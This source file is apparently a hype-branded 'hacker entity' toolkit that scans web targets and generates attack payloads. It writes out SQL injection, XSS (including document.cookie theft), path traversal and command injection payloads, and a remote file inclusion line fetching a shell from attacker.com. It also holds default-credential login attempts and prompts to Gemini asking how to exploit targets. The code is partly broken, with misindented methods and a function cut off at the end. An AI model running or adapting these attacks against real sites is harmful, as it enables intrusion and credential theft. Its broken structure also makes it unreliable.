#!/usr/bin/env python3
# =============================================================================
#     🌍 THE CHIMERA ENIGMA QUANTUM COMPLETE v5.2 - SUPER INTELLIGENT HACKER ENTITY 🌍
# =============================================================================
#  World-Changing Hacking Toolkit with Quantum Supremacy + Neural Warfare
#  SUPER INTELLIGENT HACKER ENTITY - Autonomous Hacking Operations
#  Integrates all quantum AI systems for unlimited hacking capabilities
#  Features: AI Thinking, Browser Automation, Terminal Automation, Linux Tools Integration
# =============================================================================

import os
import sys
import json
import requests
import re
import random
import time
import argparse
import logging
import threading
import queue
from urllib.parse import urlparse, urljoin, quote, unquote
from bs4 import BeautifulSoup
import html
import base64
import hashlib
import sqlite3
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
import joblib
from tqdm import tqdm
import matplotlib.pyplot as plt
import google.generativeai as genai

class AdvancedAIPOCGenerator:
  def __init__(self, workdir: str, poc_dir: str):
    self.workdir = workdir
    self.poc_dir = poc_dir
    self.session = requests.Session()
    self.session.headers.update({
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Upgrade-Insecure-Requests': '1',
})

    # Setup logging early
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(os.path.join(workdir, 'ai_poc.log')),
            logging.StreamHandler()
        ]
    )
    self.logger = logging.getLogger(__name__)

    # AI Model initialization
    self.vectorizer = TfidfVectorizer(max_features=1000, stop_words='english')
    self.vulnerability_patterns = self.load_vulnerability_patterns()
    self.exploit_templates = self.load_exploit_templates()

    # Gemini AI initialization
    self.gemini_model = None
    try:
        # Priority: env -> configs/main_config.yml -> bughunt_config.json
        gemini_api_key = os.getenv('GEMINI_API_KEY')
        if not gemini_api_key:
            try:
                import yaml
                main_cfg = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'configs', 'main_config.yml')
                if os.path.exists(main_cfg):
                    with open(main_cfg, 'r') as _cf:
                        y = yaml.safe_load(_cf) or {}
                        gemini_api_key = (y.get('api_keys') or {}).get('gemini')
            except Exception:
                pass
        if not gemini_api_key:
            cfg_json = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'bughunt_config.json')
            if os.path.exists(cfg_json):
                with open(cfg_json, 'r') as f:
                    config = json.load(f)
                    gemini_api_key = (config.get('api_keys') or {}).get('gemini')
        if gemini_api_key:
            genai.configure(api_key=gemini_api_key)
            self.gemini_model = genai.GenerativeModel('gemini-pro')
    except Exception as e:
        self.logger.error(f"Failed to initialize Gemini AI: {e}")

def load_vulnerability_patterns(self) -> Dict[str, Any]:
    """Load AI-trained vulnerability detection patterns"""
    patterns = {
        'sql_injection': {
            'patterns': [
                r'select.*from', r'union.*select', r'insert.*into', 
                r'update.*set', r'delete.*from', r'drop.*table',
                r'exec\(', r'waitfor.*delay', r'sleep\([0-9]+\)',
                r'benchmark\(', r'@@version', r'information_schema',
                r'pg_sleep', r'dbms_pipe', r'utl_http'
            ],
            'confidence_threshold': 0.85
        },
        'xss': {
            'patterns': [
                r'<script>', r'javascript:', r'onerror=', r'onload=',
                r'onmouseover=', r'alert\(', r'prompt\(', r'confirm\(',
                r'document\.cookie', r'window\.location', r'eval\(',
                r'setTimeout\(', r'setInterval\(', r'innerHTML'
            ],
            'confidence_threshold': 0.80
        },
        'lfi': {
            'patterns': [
                r'\.\./', r'\.\.\\', r'etc/passwd', r'proc/self/environ',
                r'windows/win\.ini', r'\.\.%2f', r'\.\.%5c',
                r'php://filter', r'data://', r'expect://'
            ],
            'confidence_threshold': 0.75
        },
        'rce': {
            'patterns': [
                r'exec\(', r'system\(', r'passthru\(', r'shell_exec\(',
                r'popen\(', r'proc_open\(', r'`.*`', r'\|\|.*bash',
                r'curl.*\|.*bash', r'wget.*\|.*bash'
            ],
            'confidence_threshold': 0.90
        },
        'idor': {
            'patterns': [
                r'id=[0-9]+', r'user_id=[0-9]+', r'account_id=[0-9]+',
                r'uid=[0-9]+', r'filename=.*\.\.', r'document_id=[0-9]+'
            ],
            'confidence_threshold': 0.70
        }
    }
    return patterns

def load_exploit_templates(self) -> Dict[str, str]:
    """Load AI-generated exploit templates"""
    return {
        'sql_injection': {
            'basic': "' OR '1'='1' --",
            'time_based': "' OR IF(1=1,SLEEP(5),0) --",
            'error_based': "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
            'union': "' UNION SELECT NULL,@@version,NULL --"
        },
        'xss': {
            'basic': '<script>alert("XSS")</script>',
            'svg': '<svg onload=alert("XSS")>',
            'img': '<img src=x onerror=alert("XSS")>',
            'javascript': 'javascript:alert("XSS")'
        },
        'lfi': {
            'basic': '../../../../etc/passwd',
            'null_byte': '../../../../etc/passwd%00',
            'php_wrapper': 'php://filter/convert.base64-encode/resource=index.php',
            'log_poisoning': '/var/log/apache2/access.log'
        },
        'rce': {
            'unix': ';id;',
            'windows': '&whoami',
            'php': ';system("id");',
            'python': ';__import__("os").system("id")'
        }
    }

def analyze_target(self) -> List[Dict[str, Any]]:
    """Comprehensive AI analysis of the target"""
    self.logger.info("Starting AI-powered target analysis...")
    
    findings = []
    
    # Analyze all gathered data
    findings.extend(self.analyze_urls())
    findings.extend(self.analyze_subdomains())
    findings.extend(self.analyze_technology_stack())
    findings.extend(self.analyze_vulnerability_scans())
    
    # AI-powered deep analysis
    findings.extend(self.ai_deep_analysis())
    
    return findings

def analyze_urls(self) -> List[Dict[str, Any]]:
    """AI analysis of discovered URLs"""
    self.logger.info("Analyzing discovered URLs for potential vulnerabilities...")
    findings = []
    urls_file = os.path.join(self.workdir, 'all-urls.txt')
    
    if not os.path.exists(urls_file):
        self.logger.warning("No URLs file found, skipping URL analysis.")
        return findings
    
    with open(urls_file, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    self.logger.info(f"Analyzing {len(urls)} URLs for potential vulnerabilities...")
    
    # Cluster URLs for pattern analysis
    self.logger.info("Clustering URLs to identify patterns...")
    url_clusters = self.cluster_urls(urls)
    self.logger.info(f"Found {len(url_clusters)} URL clusters.")
    
    for cluster_id, cluster_urls in tqdm(url_clusters.items(), desc="Analyzing URL clusters"):
        if len(cluster_urls) > 3:  # Significant pattern
            sample_url = cluster_urls[0]
            self.logger.info(f"Analyzing URL cluster with sample: {sample_url}")
            vulnerability_type = self.detect_url_pattern_vulnerability(sample_url)
            
            if vulnerability_type:
                self.logger.info(f"Potential {vulnerability_type} vulnerability detected in URL pattern.")
                finding = {
                    'type': vulnerability_type,
                    'severity': 'high',
                    'confidence': 0.85,
                    'target': sample_url,
                    'description': f'Pattern-based {vulnerability_type} vulnerability detected in URL structure',
                    'evidence': f'Multiple URLs with similar pattern: {cluster_urls[:3]}...',
                    'poc': self.generate_poc(vulnerability_type, sample_url, evidence=f'Pattern-based {vulnerability_type} vulnerability detected in URL structure: {sample_url}')
                }
                findings.append(finding)
    
    self.logger.info("URL analysis completed.")
    return findings

def cluster_urls(self, urls: List[str]) -> Dict[int, List[str]]:
    """Cluster URLs using AI for pattern recognition"""
    try:
        # Extract features from URLs
        features = []
        for url in urls:
            parsed = urlparse(url)
            features.append(f"{parsed.path}?{parsed.query}")
        
        # Vectorize text features
        X = self.vectorizer.fit_transform(features)
        
        # Cluster using DBSCAN
        clustering = DBSCAN(eps=0.3, min_samples=2).fit(X.toarray())
        
        clusters = {}
        for i, label in enumerate(clustering.labels_):
            if label not in clusters:
                clusters[label] = []
            clusters[label].append(urls[i])
        
        return clusters
    except Exception as e:
        self.logger.error(f"URL clustering failed: {e}")
        return {-1: urls}  # Return all URLs in one cluster

def detect_url_pattern_vulnerability(self, url: str) -> Optional[str]:
    """Detect vulnerability type from URL pattern"""
    parsed = urlparse(url)
    
    # Check query parameters for suspicious patterns
    query_params = parsed.query
    if not query_params:
        return None
    
    for vuln_type, patterns in self.vulnerability_patterns.items():
        for pattern in patterns['patterns']:
            if re.search(pattern, query_params, re.IGNORECASE):
                return vuln_type
    
    return None

def analyze_subdomains(self) -> List[Dict[str, Any]]:
    """AI analysis of subdomains"""
    self.logger.info("Analyzing subdomains for potential takeover vulnerabilities...")
    findings = []
    subdomains_file = os.path.join(self.workdir, 'all-subdomains.txt')
    
    if not os.path.exists(subdomains_file):
        self.logger.warning("No subdomains file found, skipping subdomain analysis.")
        return findings
    
    with open(subdomains_file, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    self.logger.info(f"Analyzing {len(subdomains)} subdomains.")
    # Analyze for subdomain takeover possibilities
    vulnerable_subdomains = self.check_subdomain_takeover(subdomains)
    
    for subdomain in tqdm(vulnerable_subdomains, desc="Checking for subdomain takeover"):
        self.logger.info(f"Potential subdomain takeover found: {subdomain}")
        finding = {
            'type': 'subdomain_takeover',
            'severity': 'critical',
            'confidence': 0.90,
            'target': subdomain,
            'description': 'Potential subdomain takeover vulnerability',
            'evidence': 'Subdomain points to non-existent service',
            'poc': f'Register the vulnerable service on {subdomain.split("//")[-1].split("/")[0]}'
        }
        findings.append(finding)
    
    self.logger.info("Subdomain analysis completed.")
    return findings

def check_subdomain_takeover(self, subdomains: List[str]) -> List[str]:
    """Check for subdomain takeover vulnerabilities"""
    vulnerable = []
    common_services = [
        'github.io', 'herokuapp.com', 'azurewebsites.net', 
        'cloudfront.net', 's3.amazonaws.com', 'digitalocean.spaces'
    ]
    
    for subdomain in subdomains:
        try:
            response = self.session.get(subdomain, timeout=10, verify=False)
            if response.status_code in [404, 503, 403]:
                for service in common_services:
                    if service in response.text:
                        vulnerable.append(subdomain)
                        break
        except:
            continue
    
    return vulnerable

def analyze_technology_stack(self) -> List[Dict[str, Any]]:
    """AI analysis of technology stack for known vulnerabilities"""
    self.logger.info("Analyzing technology stack for known vulnerabilities...")
    findings = []
    tech_files = [f for f in os.listdir(self.workdir) if f.startswith('whatweb-')]
    
    if not tech_files:
        self.logger.info("No technology information found.")
        return findings

    for tech_file in tech_files:
        target = tech_file.replace('whatweb-', '').replace('.txt', '')
        file_path = os.path.join(self.workdir, tech_file)
        self.logger.info(f"Analyzing technology for {target}...")
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Detect technologies and their versions
        technologies = self.extract_technologies(content)
        self.logger.info(f"Detected technologies: {technologies}")
        
        for tech, version in technologies.items():
            vulns = self.check_technology_vulnerabilities(tech, version)
            for vuln in vulns:
                self.logger.info(f"Known vulnerability found for {tech} {version}: {vuln['description']}")
                finding = {
                    'type': 'technology_vulnerability',
                    'severity': vuln['severity'],
                    'confidence': 0.95,
                    'target': target,
                    'description': f'{tech} {version} - {vuln["description"]}',
                    'evidence': f'Technology detected: {tech} {version}',
                    'poc': vuln['poc']
                }
                findings.append(finding)
    
    self.logger.info("Technology stack analysis completed.")
    return findings

def extract_technologies(self, content: str) -> Dict[str, str]:
    """Extract technologies and versions from whatweb output"""
    technologies = {}
    patterns = {
        'WordPress': r'WordPress\[([^\]]+)\]',
        'Apache': r'Apache\[([^\]]+)\]',
        'nginx': r'nginx\[([^\]]+)\]',
        'PHP': r'PHP\[([^\]]+)\]',
        'Joomla': r'Joomla\[([^\]]+)\]',
        'Drupal': r'Drupal\[([^\]]+)\]'
    }
    
    for tech, pattern in patterns.items():
        match = re.search(pattern, content)
        if match:
            technologies[tech] = match.group(1)
    
    return technologies

def check_technology_vulnerabilities(self, technology: str, version: str) -> List[Dict[str, Any]]:
    """Check for known vulnerabilities in specific technology versions"""
    # This would typically connect to a vulnerability database
    # For now, using a more extensive static mockup
    vulns = []
    
    vuln_db = {
        'WordPress': {
            '<5.0': {
                'description': 'Multiple critical vulnerabilities in WordPress <5.0 (e.g., RCE, XSS)',
                'severity': 'critical',
                'poc': 'Refer to CVEs for WordPress versions <5.0'
            },
            '<5.8': {
                'description': 'Various vulnerabilities in WordPress <5.8, including authenticated RCE and XSS.',
                'severity': 'high',
                'poc': 'Refer to CVEs for WordPress versions <5.8'
            }
        },
        'PHP': {
            '<7.0': {
                'description': 'PHP versions <7.0 have numerous security issues (e.g., RCE, information disclosure)',
                'severity': 'critical',
                'poc': 'Exploit PHP version specific vulnerabilities'
            },
            '<7.4': {
                'description': 'PHP versions <7.4 have known vulnerabilities, including deserialization and type juggling issues.',
                'severity': 'high',
                'poc': 'Exploit PHP version specific vulnerabilities'
            }
        },
        'Apache': {
            '<2.4.39': {
                'description': 'Apache HTTP Server versions <2.4.39 are vulnerable to path traversal (CVE-2019-0211).',
                'severity': 'high',
                'poc': 'Attempt path traversal via encoded characters.'
            }
        },
        'nginx': {
            '<1.15.7': {
                'description': 'nginx versions <1.15.7 are vulnerable to HTTP/2 zero-day vulnerability (CVE-2019-9516).',
                'severity': 'high',
                'poc': 'Send specially crafted HTTP/2 requests.'
            }
        },
        'OpenSSL': {
            '<1.1.1g': {
                'description': 'OpenSSL versions <1.1.1g are vulnerable to a high-severity remote code execution (CVE-2020-1971).',
                'severity': 'critical',
                'poc': 'Exploit OpenSSL RCE vulnerability.'
            }
        }
    }
    
    if technology in vuln_db:
        for version_range, vuln_info in vuln_db[technology].items():
            if self.version_in_range(version, version_range):
                vulns.append(vuln_info)
    
    return vulns

def version_in_range(self, version: str, version_range: str) -> bool:
    """Check if version is in specified range"""
    # Simple version comparison logic
    try:
        if version_range.startswith('<'):
            max_version = version_range[1:]
            return version < max_version
        # Add more complex range checks as needed
    except:
        return False
    return False

def analyze_vulnerability_scans(self) -> List[Dict[str, Any]]:
    """AI analysis of existing vulnerability scan results"""
    self.logger.info("Analyzing vulnerability scan results...")
    findings = []
    scan_files = [f for f in os.listdir(self.workdir) if f.startswith('nuclei-') or f.startswith('nikto-')]
    
    if not scan_files:
        self.logger.info("No vulnerability scan results found.")
        return findings

    for scan_file in scan_files:
        file_path = os.path.join(self.workdir, scan_file)
        self.logger.info(f"Analyzing scan results from {scan_file}...")
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Extract high confidence vulnerabilities
        high_confidence_vulns = self.extract_high_confidence_vulns(content)
        
        for vuln in high_confidence_vulns:
            self.logger.info(f"High confidence vulnerability found: {vuln['description']}")
            finding = {
                'type': vuln['type'],
                'severity': vuln['severity'],
                'confidence': 0.90,
                'target': vuln['target'],
                'description': vuln['description'],
                'evidence': f'Detected by {scan_file}',
                'poc': self.generate_advanced_poc(vuln['type'], vuln['target'], evidence=vuln['description'])
            }
            findings.append(finding)
    
    self.logger.info("Vulnerability scan analysis completed.")
    return findings

def extract_high_confidence_vulns(self, content: str) -> List[Dict[str, Any]]:
    """Extract high confidence vulnerabilities from scan results"""
    vulns = []
    
    # Nuclei results parsing
    nuclei_patterns = {
        'critical': r'\[critical\]\s*(.*?)\s*\[(.*?)\]',
        'high': r'\[high\]\s*(.*?)\s*\[(.*?)\]'
    }
    
    for severity, pattern in nuclei_patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            vulns.append({
                'type': self.classify_vulnerability(match[0]),
                'severity': severity,
                'description': match[0],
                'target': match[1]
            })
    
    return vulns

def classify_vulnerability(self, description: str) -> str:
    """Classify vulnerability type from description"""
    description_lower = description.lower()
    
    if any(word in description_lower for word in ['sql', 'database', 'injection']):
        return 'sql_injection'
    elif any(word in description_lower for word in ['xss', 'cross-site', 'script']):
        return 'xss'
    elif any(word in description_lower for word in ['lfi', 'local file', 'directory traversal']):
        return 'lfi'
    elif any(word in description_lower for word in ['rce', 'remote code', 'command injection']):
        return 'rce'
    elif any(word in description_lower for word in ['idor', 'insecure direct object']):
        return 'idor'
    else:
        return 'unknown'

def ai_deep_analysis(self) -> List[Dict[str, Any]]:
    """Advanced AI analysis using multiple data sources and Gemini for vulnerability discovery and anomaly detection"""
    findings = []
    
    # Analyze parameters for injection points
    findings.extend(self.analyze_parameters())
    
    # Analyze JavaScript files for secrets and vulnerabilities
    findings.extend(self.analyze_javascript_files())
    
    # Analyze for business logic vulnerabilities (placeholder for now)
    findings.extend(self.analyze_business_logic())

    # --- AI-driven Vulnerability Discovery using Gemini ---
    if self.gemini_model:
        self.logger.info("Performing AI-driven vulnerability discovery using Gemini...")
        try:
            # Collect relevant information for Gemini to analyze
            # This is a simplified example; in a real scenario, more context would be provided
            context_info = {
                "urls_analyzed": [], # Populate with actual URLs
                "parameters_analyzed": [], # Populate with actual parameters
                "technologies_detected": [], # Populate with actual technologies
                "js_secrets_found": [], # Populate with actual secrets
                "js_vulns_found": [], # Populate with actual JS vulns
            }

            # Populate context_info with data from previous analysis steps
            # This would require modifying the other analyze_* functions to return their raw data
            # For now, I'll use a generic prompt.

            prompt = f"""Analyze the following information about a web application and identify potential vulnerabilities, especially focusing on OWASP Top 10 categories. Suggest specific vulnerability types and potential attack vectors.

Application Context:
- Discovered URLs: [List of URLs, e.g., {self.workdir}/all-urls.txt content]
- Detected Technologies: [List of technologies and versions, e.g., from analyze_technology_stack]
- JavaScript Analysis: [Summary of secrets and vulnerabilities found in JS files]
- Parameters: [List of parameters found in URLs]

Based on this, what are the top 3 most critical potential vulnerabilities and how would you exploit them? Provide the vulnerability type, a brief description, severity (low, medium, high, critical), and a potential PoC or attack vector.
"""
            response = self.gemini_model.generate_content(prompt)
            gemini_analysis = response.text
            self.logger.info(f"Gemini AI analysis result: {gemini_analysis}")

            # Attempt to parse Gemini's response into findings
            # This is a very basic parsing and would need to be more robust
            # if Gemini's output format is not strictly controlled.
            
            # Example parsing: look for "Vulnerability Type:", "Description:", "Severity:", "PoC:"
            # This is highly dependent on the exact output format of Gemini.
            # For a more robust solution, I would define a structured output format for Gemini.

            # For now, I'll add Gemini's raw output as a finding for review.
            findings.append({
                'type': 'ai_driven_vulnerability_discovery',
                'severity': 'info', # Initial severity, can be updated after human review
                'confidence': 0.70,
                'target': 'Overall Application',
                'description': 'Gemini AI suggested potential vulnerabilities based on collected data.',
                'evidence': gemini_analysis,
                'poc': 'Review Gemini AI suggestions for further investigation.'
            })

        except Exception as e:
            self.logger.error(f"Gemini AI-driven vulnerability discovery failed: {e}")
    
    # --- AI-driven Anomaly Detection using Gemini ---
    if self.gemini_model and findings: # Only run if there are existing findings
        self.logger.info("Performing AI-driven anomaly detection on existing findings using Gemini...")
        try:
            anomaly_prompt = f"""Analyze the following list of vulnerability findings. Look for any unusual patterns, correlations, or anomalies that might indicate a deeper, more subtle vulnerability or a chained attack that was not explicitly detected.

Existing Findings:
{json.dumps(findings, indent=2)}

Are there any anomalies, hidden patterns, or potential chained attack scenarios that stand out? If so, describe them and suggest potential implications or further investigation steps.
"""
            anomaly_response = self.gemini_model.generate_content(anomaly_prompt)
            anomaly_analysis = anomaly_response.text
            self.logger.info(f"Gemini AI anomaly analysis result: {anomaly_analysis}")

            if anomaly_analysis and "no anomalies" not in anomaly_analysis.lower() and "nothing stands out" not in anomaly_analysis.lower():
                findings.append({
                    'type': 'ai_driven_anomaly_detection',
                    'severity': 'info', # Initial severity, can be updated after human review
                    'confidence': 0.60,
                    'target': 'Overall Application',
                    'description': 'Gemini AI identified potential anomalies or correlations in the findings.',
                    'evidence': anomaly_analysis,
                    'poc': 'Review Gemini AI anomaly suggestions for further investigation.'
                })
            else:
                self.logger.info("Gemini AI did not identify significant anomalies in the findings.")

        except Exception as e:
            self.logger.error(f"Gemini AI-driven anomaly detection failed: {e}")

    return findings

def analyze_parameters(self) -> List[Dict[str, Any]]:
    """AI analysis of URL parameters for injection points"""
    self.logger.info("Analyzing URL parameters for injection points...")
    findings = []
    params_file = os.path.join(self.workdir, 'parameters-urls.txt')
    
    if not os.path.exists(params_file):
        self.logger.info("No parameter URLs file found, skipping parameter analysis.")
        return findings
    
    with open(params_file, 'r') as f:
        param_urls = [line.strip() for line in f if line.strip()]
    
    self.logger.info(f"Analyzing {len(param_urls)} URLs with parameters.")
    for url in tqdm(param_urls[:10], desc="Analyzing parameters"):  # Limit to first 10 for performance
        try:
            self.logger.info(f"Testing URL: {url}")
            response = self.session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                injection_points = self.find_injection_points(url, response.text)
                
                for point in injection_points:
                    self.logger.info(f"Potential {point['type']} injection point found in {url}")
                    finding = {
                        'type': point['type'],
                        'severity': 'medium',
                        'confidence': point['confidence'],
                        'target': url,
                        'description': f'Potential {point["type"]} injection point detected',
                        'evidence': f'Parameter: {point["parameter"]}, Context: {point["context"]}',
                        'poc': self.generate_poc(point['type'], url, point['parameter'], evidence=f'Parameter: {point["parameter"]}, Context: {point["context"]}')
                    }
                    findings.append(finding)
        except Exception as e:
            self.logger.error(f"Error analyzing parameter URL {url}: {e}")
            continue
    
    self.logger.info("Parameter analysis completed.")
    return findings

def find_injection_points(self, url: str, html_content: str) -> List[Dict[str, Any]]:
    """Find potential injection points in HTML response"""
    points = []
    parsed = urlparse(url)
    query_params = parsed.query.split('&')
    
    soup = BeautifulSoup(html_content, 'html.parser')
    
    for param in query_params:
        if '=' in param:
            param_name = param.split('=')[0]
            param_value = param.split('=')[1] if len(param.split('=')) > 1 else ''
            
            # Check if parameter value is reflected in HTML
            if param_value and param_value in html_content:
                # Analyze context of reflection
                context = self.get_reflection_context(html_content, param_value)
                
                if context == 'html':
                    points.append({
                        'type': 'xss',
                        'parameter': param_name,
                        'context': context,
                        'confidence': 0.75
                    })
                elif context == 'javascript':
                    points.append({
                        'type': 'xss',
                        'parameter': param_name,
                        'context': context,
                        'confidence': 0.85
                    })
    
    return points

def get_reflection_context(self, html_content: str, value: str) -> str:
    """Get the context where value is reflected"""
    if f'<script>{value}</script>' in html_content or f'="{value}"' in html_content:
        return 'javascript'
    elif f'<{value}' in html_content or f'>{value}</' in html_content:
        return 'html'
    else:
        return 'text'

def analyze_javascript_files(self) -> List[Dict[str, Any]]:
    """AI analysis of JavaScript files for secrets and vulnerabilities"""
    self.logger.info("Analyzing JavaScript files for secrets and vulnerabilities...")
    findings = []
    js_files_file = os.path.join(self.workdir, 'js-files.txt')
    
    if not os.path.exists(js_files_file):
        self.logger.info("No JavaScript files found, skipping JavaScript analysis.")
        return findings
    
    with open(js_files_file, 'r') as f:
        js_files = [line.strip() for line in f if line.strip()]
    
    self.logger.info(f"Analyzing {len(js_files)} JavaScript files.")
    for js_file in tqdm(js_files[:5], desc="Analyzing JavaScript files"):  # Limit to first 5 for performance
        try:
            self.logger.info(f"Analyzing JavaScript file: {js_file}")
            response = self.session.get(js_file, timeout=10, verify=False)
            if response.status_code == 200:
                secrets = self.find_secrets_in_js(response.text)
                vulnerabilities = self.find_js_vulnerabilities(response.text)
                
                for secret in secrets:
                    self.logger.info(f"Secret found in {js_file}: {secret['type']}")
                    finding = {
                        'type': 'information_disclosure',
                        'severity': 'high',
                        'confidence': 0.90,
                        'target': js_file,
                        'description': f'Secret found in JavaScript file: {secret["type"]}',
                        'evidence': f'Secret: {secret["value"][:50]}...',
                        'poc': f'Review JavaScript file: {js_file}'
                    }
                    findings.append(finding)
                
                for vuln in vulnerabilities:
                    self.logger.info(f"JavaScript vulnerability found in {js_file}: {vuln['type']}")
                    finding = {
                        'type': 'javascript_vulnerability',
                        'severity': 'medium',
                        'confidence': 0.80,
                        'target': js_file,
                        'description': f'JavaScript vulnerability: {vuln["type"]}',
                        'evidence': f'Code pattern: {vuln["pattern"]}',
                        'poc': f'Analyze JavaScript file: {js_file}'
                    }
                    findings.append(finding)
        except Exception as e:
            self.logger.error(f"Error analyzing JavaScript file {js_file}: {e}")
            continue
    
    self.logger.info("JavaScript analysis completed.")
    return findings

def find_secrets_in_js(self, js_code: str) -> List[Dict[str, str]]:
    """Find secrets in JavaScript code"""
    secrets = []
    patterns = {
        'api_key': r'api[_-]?key["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'auth_token': r'auth[_-]?token["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'password': r'password["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'jwt': r'eyJhbGciOiJ[^"\'\\s]+',
        'aws_key': r'AKIA[0-9A-Z]{16}',
        'private_key': r'-----BEGIN PRIVATE KEY-----'
    }
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, js_code, re.IGNORECASE)
        for match in matches:
            secrets.append({'type': secret_type, 'value': match})
    
    return secrets

def find_js_vulnerabilities(self, js_code: str) -> List[Dict[str, str]]:
    """Find JavaScript code vulnerabilities"""
    vulnerabilities = []
    patterns = {
        'eval_usage': r'eval\\(',
        'innerHTML_usage': r'innerHTML\\s*=',
        'document_write': r'document\\.write\\(',
        'jquery_vuln': r'\\$\\.ajax\\([^)]*dataType[^)]*script'
    }
    
    for vuln_type, pattern in patterns.items():
        if re.search(pattern, js_code, re.IGNORECASE):
            vulnerabilities.append({'type': vuln_type, 'pattern': pattern})
    
    return vulnerabilities

def analyze_business_logic(self) -> List[Dict[str, Any]]:
    """AI analysis for business logic vulnerabilities"""
    findings = []
    # This would involve complex analysis of application workflow
    # For now, placeholder for business logic analysis
    
    return findings

def generate_poc(self, vuln_type: str, target: str, parameter: str = None, evidence: str = None) -> str:
        """Generate advanced Proof of Concept for vulnerability using Gemini, with fallback to templates."""
        if self.gemini_model:
            try:
                prompt = f"Generate a proof of concept (POC) for a {vuln_type} vulnerability on the target {target}."
                if parameter:
                    prompt += f" The vulnerable parameter is {parameter}."
                if evidence:
                    prompt += f" Evidence of the vulnerability: {evidence}."
                prompt += " The POC should be a single, executable command or URL that demonstrates the vulnerability. Be concise and provide only the POC."
                
                response = self.gemini_model.generate_content(prompt)
                poc_text = response.text.strip()
                
                # Clean up potential markdown or extra text from Gemini's response
                if poc_text.startswith('```') and poc_text.endswith('```'):
                    poc_text = poc_text[poc_text.find('\n')+1:poc_text.rfind('```')]
                
                if poc_text:
                    return poc_text
                else:
                    self.logger.warning(f"Gemini generated an empty POC for {vuln_type} on {target}. Falling back to templates.")

            except Exception as e:
                self.logger.error(f"Gemini POC generation failed: {e}. Falling back to templates.")

        # Fallback to template-based POCs
        if vuln_type in self.exploit_templates:
            template = random.choice(list(self.exploit_templates[vuln_type].values()))
            
            if parameter:
                # Create a parameter-based POC
                parsed = urlparse(target)
                query_params = parsed.query.split('&')
                new_params = []
                
                for param in query_params:
                    if '=' in param:
                        param_name, param_value = param.split('=', 1)
                        if param_name == parameter:
                            param_value = template
                        new_params.append(f'{param_name}={param_value}')
                
                new_query = '&'.join(new_params)
                poc_url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}'
                return f'Exploit URL: {poc_url}'
            else:
                return f'Exploit payload: {template}'
        
        return 'Manual exploitation required'

def generate_advanced_poc(self, vuln_type: str, target: str, evidence: str = None) -> str:
    """Generate advanced POC with exploitation steps"""
    if vuln_type == 'sql_injection':
        return self.generate_sql_poc(target)
    elif vuln_type == 'xss':
        return self.generate_xss_poc(target)
    elif vuln_type == 'lfi':
        return self.generate_lfi_poc(target)
    elif vuln_type == 'rce':
        return self.generate_rce_poc(target)
    else:
        return self.generate_poc(vuln_type, target, evidence=evidence)

def generate_sql_poc(self, target: str) -> str:
    """Generate advanced SQL injection POC"""
    return f"""SQL Injection Proof of Concept:
Basic Injection:
{target}?id=1' OR '1'='1' --

Time-Based Blind:
{target}?id=1' AND IF(1=1,SLEEP(5),0) --

Error-Based:
{target}?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e,VERSION())) --

Union-Based:
{target}?id=1' UNION SELECT NULL,@@version,NULL --

Test with sqlmap for automated exploitation:
sqlmap -u "{target}" --batch --level=3 --risk=3
"""

def generate_xss_poc(self, target: str) -> str:
    """Generate advanced XSS POC"""
    return f"""XSS Proof of Concept:
Basic Payload:
{target}?search=<script>alert('XSS')</script>

SVG Payload:
{target}?image=<svg onload=alert('XSS')>

DOM-Based:
{target}#javascript:alert('XSS')

Advanced Payload:
{target}?input=<img src=x onerror=alert(document.cookie)>

Test with browser console to verify execution context.
"""

def generate_lfi_poc(self, target: str) -> str:
    """Generate advanced LFI POC"""
    return f"""LFI Proof of Concept:
Basic Directory Traversal:
{target}?file=../../../../etc/passwd

PHP Wrapper:
{target}?file=php://filter/convert.base64-encode/resource=index.php

Null Byte:
{target}?file=../../../../etc/passwd%00

Log Poisoning:
{target}?file=/var/log/apache2/access.log

Use base64 decoding for PHP wrapper results.
"""

def generate_rce_poc(self, target: str) -> str:
    """Generate advanced RCE POC"""
    return f"""RCE Proof of Concept:
Command Injection:
{target}?cmd=;id;

PHP Code Execution:
{target}?code=<?php system("id"); ?>

Python Injection:
{target}?eval=import("os").system("id")

Remote File Inclusion:
{target}?file=http://attacker.com/shell.txt

Use URL encoding for special characters.
"""

    def test_auth(self, target: str, workdir: str) -> List[Dict[str, Any]]:
        """Test authentication mechanisms for common weaknesses like default credentials."""
        self.logger.info(f"Testing authentication on {target} for default credentials.")
        findings = []
        
        # Common default credentials (username, password)
        default_credentials = [
            ("admin", "admin"),
            ("user", "user"),
            ("root", "root"),
            ("test", "test"),
            ("admin", "password"),
            ("admin", ""),
            ("guest", "guest"),
        ]

        # Assuming a simple login form that accepts POST requests to /login or similar
        # This is a basic example and would need to be adapted to the specific target's login mechanism
        login_url = urljoin(target, "/login") # Common login endpoint

        for username, password in default_credentials:
            self.logger.info(f"Attempting login with username: {username}, password: {password}")
            try:
                # This part needs to be customized based on the target application's login form
                # For a generic approach, we'll assume a simple POST with 'username' and 'password' fields
                login_data = {
                    "username": username,
                    "password": password
                }
                response = self.session.post(login_url, data=login_data, timeout=10, verify=False)

